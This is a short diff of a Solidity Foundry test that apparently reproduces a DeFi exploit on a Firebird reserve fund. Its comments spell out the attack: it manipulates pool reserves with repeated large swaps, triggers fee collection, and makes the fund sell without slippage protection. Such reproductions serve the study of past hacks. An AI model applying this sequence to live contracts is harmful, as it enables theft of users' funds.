@@ -110,8 +110,8 @@ contract ContractTest is Test {
         uint amountIn = 226_000_000_000_000_000_000_000;
         uint secAmount = routerSwap(address(WMATIC), address(USDC), amount - amountIn, 1, address(ce2c_FBP), 1); // swap WMATIC to USDC
         for (uint i=0; i<3; i++){
-            amountIn = routerSwap(address(WMATIC), address(HOPE), amountIn, 1, address(FLP), 1); // swap WMATIC to HOPE, inflate WMATIC reserve in WMATIC-HOPE LP
-            ReserveFund.collectFeeFromProtocol();                                                // collect fee from protocol, burn WMATIC-HOPE LP, sent WMATIC to 'FirebirdReserveFund'
+            amountIn = routerSwap(address(WMATIC), address(HOPE), amountIn, 1, address(FLP), 1); // swap WMATIC to HOPE, deflate HOPE reserve in WMATIC-HOPE LP
+            ReserveFund.collectFeeFromProtocol();                                                // collect fee from protocol, burn WMATIC-HOPE LP, sent WMATIC to 'FirebirdReserveFund', a large amount of WMATIC-HOPE LP mint through manipulated mintLiquidityFee() function 
             amountIn = routerSwap(address(HOPE), address(WMATIC), amountIn, 1, address(FLP), 1); // swap HOPE to WMATIC back
         }
         ReserveFund.sellTokensToUsdc(); // 'FirebirdReserveFund' swap WMATIC to USDC without slippage protection
